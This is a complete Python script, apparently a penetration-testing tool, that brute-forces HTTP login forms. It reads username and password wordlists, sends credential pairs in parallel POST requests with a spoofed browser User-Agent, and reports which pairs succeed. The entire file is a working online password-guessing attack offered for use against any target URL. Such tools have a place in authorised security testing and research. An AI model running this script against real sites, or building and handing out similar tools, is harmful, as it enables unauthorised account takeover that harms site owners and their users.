#!/usr/bin/env python3

'''

A script to brute force http forms (or any post request for that matter!)

Author : Blackfell
Twitter : @blackf3ll
Email: info@blackfell.net

'''


import requests
import multiprocessing
import argparse
import progressbar

from sys import exit
from os.path import exists
from time import sleep, time, strftime, gmtime
from queue import Empty as EmptyErr

from resources import bcolors as bc

def get_args():
    parser = argparse.ArgumentParser()
    passwords = parser.add_mutually_exclusive_group(required = True)
    users = parser.add_mutually_exclusive_group(required = True)
    condition = parser.add_mutually_exclusive_group(required = True)
    parser.add_argument("-u", "--url", type = str, required = True,\
            help = "Hostname or IP address to attack (e.g. http://site.com/login.php).")
    users.add_argument("-l", "--login", type = str, help = "Username to attack with.")
    users.add_argument("-L", "--login-list", type = str, help = "User list to attack with.")
    passwords.add_argument("-p", "--password", type = str, help = "Password to attack with.")
    passwords.add_argument("-P", "--password-list", type = str, help = "Password list to attack with.")
    parser.add_argument("-t ", "--threads", type = int, default = 25, \
            help = "Number of attack threads (default - 25)")
    parser.add_argument("-pU", "--user-param", type = str, default = "username", \
            help = "HTTP form parameter for username (without '&') default setting 'username'.")
    parser.add_argument("-pP", "--pass-param", type = str, default = "password", \
            help = "HTTP form parameter for password (without '&') default setting 'password'.")
    parser.add_argument("-pE", "--extra-param", action = 'append', type = str, nargs='+' , \
            help = "Extra (non-brutable) form parameter (.e.g. '&login=Submit' ")
    parser.add_argument("-c", "--cont", default=False, action="store_true", \
            help = "Continue brute-forcing once one valid cred has been found (Default False).' ")
    condition.add_argument("-sM", "--success-match", type = str, \
            help = "String to match on successful login - if found - login successful (e.g. \"Successful\").")
    condition.add_argument("-sX", "--success-exclude", type = str, \
            help = "String to match on failed login - if not found, login successful (e.g. \"not valid\").")

    args = parser.parse_args()

    return args

def guesser(url, fmt_str, hdr, login_q, sM, sX, kill_flag, struck_gold, done_q):
    while True:
        rd = None
        if kill_flag.is_set():
            return
        try:
            rd = login_q.get_nowait()
            if not rd: continue #Because sometimes the queue has null in it
            #bc.info("got {} from queue".format(rd))
            data = fmt_str.format(rd[0], rd[1])
            #bc.info("Sending request.\nurl = {}\ndata = {}\nheaders = {}".format(url, data, hdr))
            r = requests.post(url=url, data=data, headers=hdr)

            #Check success
            if (sM and sM in r.text) or (sX and sX not in r.text):
                struck_gold.set()
                bc.success("Credentials found!")
                print("\t[ {} ] = {} [ {} ] = [ {} ]".format( \
                        bc.bold_format('User'), bc.green_format(str(rd[0]), ''), \
                        bc.bold_format('Password'), bc.green_format(str(rd[1]), '')))

            #Tell main loop we guessed one
            done_q.put("One more thing tried!")

        except EmptyErr:
            pass
        except BrokenPipeError as e:
            if rd:
                bc.warn("Error when trying credentials : {}\n{}".format(rd, e))
            else:
                pass
        except ConnectionResetError as e:
            if rd:
                bc.warn("Error when trying credentials : {}\n{}".format(rd, e))
            else:
                pass
        except requests.exceptions.ConnectionError as e:
            bc.warn("Couldn't connect when trying credentials : {}\nCheck target host is up if error persists.\n{}".format(rd, e))
        except KeyboardInterrupt:
            return

def get_crack_mode(login_list, password_list, user, password):

    #Check files exist and set mode
    if password_list and login_list:
        if not exists(password_list):
            bc.err("Password list : {} does not exist!".format(password_list))
            return False
        elif not exists(login_list):
            bc.err("User list : {} does not exist!".format(login_list))
            return False
        else:
            return 'double'
    elif password_list and user:
        if not exists(password_list):
            bc.err("Password list : {} does not exist!".format(password_list))
            return False
        else:
            return "password"
    elif login_list and password:
        if not exists(login_list):
            bc.err("User list : {} does not exist!".format(login_list))
            return False
        else:
            return "user"
    else:
        bc.err("No valid brute force options. Try supplying a userlist, passwordlist or both.")
        return

def file_len(fname):
    i =0
    with open(fname, 'rb') as f:
        #for i, l in enumerate(f):
        #    pass
        for line in f:
            line = line.strip(b'\r\n')
            if not line: continue
            i +=1

    return i

def double_crack(login_list, password_list, login_q, len_q):
    i = 0
    j = 0
    try:
        n_login = file_len(login_list)
        n_pass = file_len(password_list)
        bc.info("Attempting login for {} users and {} passwords.".format(n_login, n_pass), True)
        len_q.put(n_login*n_pass)
        #For each line in the file, bang it in the queue
        with open(login_list, 'r', encoding='latin-1') as ul:
            for u in ul:
                u = u.strip()
                if not u: continue
                i += 1
                with open(password_list, 'r', encoding='latin-1') as pl:
                    for p in pl:
                        p = p.strip()
                        if not p: continue
                        j += 1
                        login_q.put([u, p])
    except UnicodeDecodeError as e:
        bc.err("Error decoding at login_list line {} & password_list line {}\n{}.".format(i,j, e))
        bc.warn("Skipping guess")
    except BrokenPipeError as e:
        bc.err("Error communicating between processes : {}".format(e))
        bc.info("Continuing")
    except ConnectionResetError as e:
        bc.err("Error communicating between processes : {}".format(e))
        bc.info("Continuing")
    except KeyboardInterrupt:
        return

def single_crack(bruter, single, single_first, login_q, len_q):
    i = 0
    try:
        n_bruter = file_len(bruter)
        if single_first:
            bc.info("Attempting login for 1 user and {} passwords.".format(n_bruter), True)
        else:
            bc.info("Attempting login for {} users and 1 password.".format(n_bruter), True)
        len_q.put(n_bruter)
        #For each line in the file, bang it in the queue
        with open(bruter, 'r', encoding='latin-1') as bl:
        #with open(bruter, 'r', encoding='utf-8') as bl:
            for b in bl:
                b = b.strip()
                if not b: continue
                i+=1
                if single_first:
                    login_q.put([single, b])
                else:
                    login_q.put([b, single])
    except UnicodeDecodeError as e:
        bc.err("Error decoding on wordlist line {}\n{}.".format(i, e))
        bc.warn("Skipping guess")
    except BrokenPipeError as e:
        bc.err("Error communicating between processes : {}".format(e))
        bc.info("Continuing")
    except ConnectionResetError as e:
        bc.err("Error communicating between processes : {}".format(e))
        bc.info("Continuing")
    except KeyboardInterrupt:
        return

def tester(url, fst, hdr, q, sm, sx, kill_flag, struck_gold):
    while True:
        if kill_flag.is_set():
            print("{} Dying gracefully".format(multiprocessing.current_process().name))
            break
        if not q.empty():
            cmd = q.get_nowait()
            print("{} : CMD : {}".format(multiprocessing.current_process().name, cmd))

        sleep(0.2)
        #print("{} Done one loop".format(multiprocessing.current_process().name))

def main():

    #Setup initial variables
    args = get_args()

    #HTML Request Variables

    #Request data
    fmt_str = "{}={}&{}={}".format(args.user_param, "{}", args.pass_param, "{}")
    if args.extra_param:
        for a in args.extra_param:
            fmt_str = fmt_str + "&{}".format(a[0])
    #Headers
    hdr = {
            "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
            "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language" : "en-US,en;q=0.5",
            "Accept-Encoding" : "gzip, deflate",
            "Referer" : args.url,
            "Content-Type" : "application/x-www-form-urlencoded",
            "Connection" : "close",
            }

    #Get crack mode
    crack_mode = get_crack_mode(args.login_list, \
        args.password_list, args.login, args.password)

        #If there's a bad file provided or some other error in crack_mode derivation
    if not crack_mode : exit(0)

    #Instantiate workers
    m = multiprocessing.Manager()
    login_q = m.Queue()
    done_q = m.Queue()
    len_q = m.Queue()
    struck_gold = multiprocessing.Event()
    kill_flag = multiprocessing.Event()
    start_time = time()

    for i in range(args.threads):
         t = multiprocessing.Process(target=guesser, args=(args.url, fmt_str, hdr, \
            login_q, args.success_match, args.success_exclude, \
            kill_flag, struck_gold, done_q))
         t.start()

    #Now we have mode, carry out attack in whatever way specified
    if crack_mode == 'double':
        #double_crack(args.login_list, args.password_list, login_q, len_q)
        t = multiprocessing.Process(target=double_crack, args=(
            args.login_list, args.password_list, login_q, len_q, ))
    elif crack_mode == 'user':
        #single_crack(args.login_list, args.password, False, login_q, len_q)
        t = multiprocessing.Process(target=single_crack, args=(
            args.login_list, args.password, False, login_q, len_q, ))
    elif crack_mode == 'password':
        #single_crack(args.password_list, args.login, True, login_q, len_q)
        t = multiprocessing.Process(target=single_crack, args=(
            args.password_list, args.login, True, login_q, len_q, ))
    else:
        bc.err("Brute force mode invalid - {}. Exiting.".format(crack_mode))
        kill_flag.set()
        sleep(0.5)
        exit(0)

    bc.info("Workers initialised. Calculating effort required.")
    #Start the bruteforce thread, reading passwords into the worker queue
    t.start()

    #When available get the number of guesses
    n_guesses = len_q.get()
    #bc.info("guesses total : {}".format(n_guesses))
    last_progress = 0.0

    with progressbar.ProgressBar(max_value= n_guesses) as bar:
        while True:
            try:
                done = done_q.qsize()
            except Exception as e:
                bc.warn("Error when checking progress : {}".format(e))
                bc.info("Continuing")
            progress = round( (done / n_guesses ) * 100 , 0)
            if struck_gold.is_set() and not args.cont:
                kill_flag.set()
                bc.info("Creds found, continue flag not set. Finishing.")
                break
            elif progress >= 100.0 and login_q.empty():
                kill_flag.set()
                sleep(1)
                bc.info("Brute complete. Shutting down...")
                break
            else:
                #Just waiting for a mate
                bar.update(done)
                sleep(1)

    #Gracefully kill everything
    for p in multiprocessing.active_children():
        p.join(0.5)

    #login_q.close()
    #login_q.join_thread()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        bc.err("Keyboard interrupt.Exiting.")
        for p in multiprocessing.active_children():
            p.join(0.5)
